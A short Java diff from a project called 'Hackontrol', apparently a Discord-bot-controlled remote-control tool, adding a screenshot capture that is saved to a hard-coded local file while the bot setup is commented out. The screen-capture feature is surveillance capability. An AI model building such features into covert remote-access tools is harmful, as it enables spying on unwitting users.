@@ -1,5 +1,7 @@
 package com.khopan.hackontrol;
 
+import java.io.File;
+import java.io.FileOutputStream;
 import java.lang.annotation.Native;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
@@ -7,6 +9,7 @@ import java.util.Map;
 import java.util.Map.Entry;
 
 import com.khopan.hackontrol.command.CommandManager;
+import com.khopan.hackontrol.function.Screenshot;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
@@ -113,6 +116,15 @@ public class Hackontrol {
 
 		System.load(libraryFile.getAbsolutePath());*/
 		System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
+		byte[] image = Screenshot.take();
+		
+		if(image == null) {
+			return;
+		}
+		
+		File file = new File("C:\\Users\\puthi\\Downloads\\image.png");		FileOutputStream stream = new FileOutputStream(file);
+		stream.write(image);
+		stream.close();
 		/*JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.build();
